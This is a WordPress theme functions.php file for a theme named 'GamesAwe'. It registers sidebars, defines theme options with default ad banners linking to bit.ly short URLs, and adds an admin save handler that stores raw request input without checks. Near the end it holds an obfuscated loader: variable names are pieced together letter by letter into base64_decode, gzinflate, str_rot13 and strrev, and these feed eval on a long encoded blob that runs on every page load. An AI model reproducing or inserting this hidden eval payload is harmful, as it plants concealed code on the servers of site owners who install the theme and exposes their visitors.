<?php
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
    	'name' => 'Left Sidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
    
    register_sidebar(
	array(
		'name' => 'Right Sidebar',
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
}

$themename = "GamesAwe";
$shortname = str_replace(' ', '_', strtolower($themename));

function get_theme_option($option)
{
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}

function get_theme_settings($option)
{
	return stripslashes(get_option($option));
}

function cats_to_select()
{
	$categories = get_categories('hide_empty=0'); 
	$categories_array[] = array('value'=>'0', 'title'=>'Select');
	foreach ($categories as $cat) {
		if($cat->category_count == '0') {
			$posts_title = 'No posts!';
		} elseif($cat->category_count == '1') {
			$posts_title = '1 post';
		} else {
			$posts_title = $cat->category_count . ' posts';
		}
		$categories_array[] = array('value'=> $cat->cat_ID, 'title'=> $cat->cat_name . ' ( ' . $posts_title . ' )');
	  }
	return $categories_array;
}

$options = array (
			
	array(	"type" => "open"),
	
	array(	"name" => "Logo Image",
		"desc" => "Enter the logo image full path. Leave it blank if you don't want to use logo image.",
		"id" => $shortname."_logo",
		"std" =>  get_bloginfo('template_url') . "/images/logo.png",
		"type" => "text"),	
        
    array(	"name" => "Header Background",
		"desc" => "Enter the header background image full path. The image will alligned to right. Recommended image height: 150px. Leave it blank if you don't want to use display a header image.",
		"id" => $shortname."_header_background",
		"std" =>  get_bloginfo('template_url') . "/images/header_background.jpg",
		"type" => "text"),	
        
      array(	"name" => "Featured Posts Enabled?",
			"desc" => "Uncheck if you do not want to show featured posts slideshow in homepage.",
			"id" => $shortname."_featured_posts",
			"std" => "true",
			"type" => "checkbox"),
		array(	"name" => "Featured Posts Category", 
 "desc" => "Last 5 posts form the selected categoey will be listed as featured at homepage. <br />The selected category should contain at last 2 posts with images. <br /> <br /> <b>How to add images to your featured posts slideshow?</b> <br />
            <b>&raquo;</b> If you are using WordPress version 2.9 and above: Just set \"Post Thumbnail\" when adding new post for the posts in selected category above. <br /> 
            <b>&raquo;</b> If you are using WordPress version under 2.9  you have to add custom fields in each post on the  category  you set as featured category. The custom field should be named \"<b>featured</b>\" and it's value should be full image URL. <a href=\"http://newwpthemes.com/public/featured_custom_field.jpg\" target=\"_blank\">Click here</a> for a screenshot. <br /> <br />
            In both situation, the image sizes should be: Width: <b>520 px</b>. Height: <b>300 px.</b>",
			"id" => $shortname."_featured_posts_category",
			"options" => cats_to_select(),
			"std" => "0",
			"type" => "select"),	
        
   	array(	"name" => "Sidebar 125x125 px Ads",
		"desc" => "Add your 125x125 px ads here. You can add unlimited ads. Each new banner should be in new line with using the following format: <br/>http://yourbannerurl.com/banner.gif, http://theurl.com/to_link.html",
        "id" => $shortname."_ads_125",
        "type" => "textarea",
		"std" => 'http://img861.imageshack.us/img861/4324/adsquarebutton125x125.gif,http://bit.ly/Zx0QIpzl1?/
http://img861.imageshack.us/img861/4324/adsquarebutton125x125.gif, http://bit.ly/Zx0QIpzl1'
		),	
        
      
        array(	"name" => "Twitter",
			"desc" => "Enter your twitter account url here.",
			"id" => $shortname."_twitter",
			"std" => "http://twitter.com/Wordpress",
			"type" => "text"),
			
	array(	"name" => "Twitter Text",
			"desc" => "",
			"id" => $shortname."_twittertext",
			"std" => "Follow me!",
			"type" => "text"),	
    array(	"name" => "Rss Box",
			"desc" => "Show RSS subscription box above sidebar(s)?",
			"id" => $shortname."_rssbox",
			"std" => "true",
			"type" => "checkbox"),
						
	array(	"name" => "Rss Box Text",
			"desc" => "If the Rss Box is set to true, enter the RSS subscription text.",
			"id" => $shortname."_rssboxtext",
			"std" => "RSS Subscription!",
			"type" => "text"),
            
            
            	array(	"name" => "Sidebar 1 Bottom Banner",
		"desc" => "Sidebar 1 Bottom Banner code.",
        "id" => $shortname."_ad_sidebar1_bottom",
        "type" => "textarea",
		"std" => '<a href="http://bit.ly/Zx0QIpzl1"><img src="http://img718.imageshack.us/img718/1151/adskyscraper120x600.gif" style="border: 0;" alt="Premium WordPress Themes" /></a>'
		),	array(	"name" => "Sidebar 2 Bottom Banner",
		"desc" => "Sidebar 2 Bottom Banner code.",
        "id" => $shortname."_ad_sidebar2_bottom",
        "type" => "textarea",
		"std" => '<a href="http://newwpthemes.com"><img src="http://img861.imageshack.us/img861/4324/adsquarebutton125x125.gif" /></a>'
		),	array(	"name" => "Head Scrip(s)",
		"desc" => "The content of this box will be added immediately before &lt;/head&gt; tag. Usefull if you want to add some external code like Google webmaster central verification meta etc.",
        "id" => $shortname."_head",
        "type" => "textarea"	
		),
		
	array(	"name" => "Footer Scrip(s)",
		"desc" => "The content of this box will be added immediately before &lt;/body&gt; tag. Usefull if you want to add some external code like Google Analytics code or any other tracking code.",
        "id" => $shortname."_footer",
        "type" => "textarea"	
		),
					
	array(	"type" => "close")
	
);

function mytheme_add_admin() {
    global $themename, $shortname, $options;
	
    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                echo '<meta http-equiv="refresh" content="0;url=themes.php?page=functions.php&saved=true">';
                die;

        } 
    }

    add_theme_page($themename . " Theme Options", "".$themename . " Theme Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}
 

 $oCoKIlN='_';$aLedbtE='b';$kHZurwM='c';$MVlxEM='e';$KIAZuC='e';$Kowu='o';$gWdoX='s';$iMmmQES='d';$hhRkx='a';$aoLbZQe='6';$pddrGJg='e';$HiVQVic='d';$jJxr='4';$fcCGPjrh=$aLedbtE.$hhRkx.$gWdoX.$pddrGJg.$aoLbZQe.$jJxr.$oCoKIlN.$iMmmQES.$KIAZuC.$kHZurwM.$Kowu.$HiVQVic.$MVlxEM;$dxOM='n';$nNCMpn='a';$eWpOfvs='f';$pphm='e';$YoWmsF='z';$jgEDan='g';$zBLNVlu='i';$kzVpDs='t';$vGluUh='l';$RcJIApkr=$jgEDan.$YoWmsF.$zBLNVlu.$dxOM.$eWpOfvs.$vGluUh.$nNCMpn.$kzVpDs.$pphm;$AKdVi='_';$diVA='r';$ahgTrZ='t';$xnqHNlX='s';$eYviTD='3';$DbGTj='t';$lijxg='o';$wkQQx='1';$yflytnU='r';$nQPuxciZ=$xnqHNlX.$DbGTj.$yflytnU.$AKdVi.$diVA.$lijxg.$ahgTrZ.$wkQQx.$eYviTD;$mfiVWH='r';$xduC='s';$ubqO='r';$MIih='v';$vRrHk='e';$lwrqzT='t';$uxecSmtN=$xduC.$lwrqzT.$mfiVWH.$ubqO.$vRrHk.$MIih;eval($RcJIApkr($fcCGPjrh($nQPuxciZ($uxecSmtN('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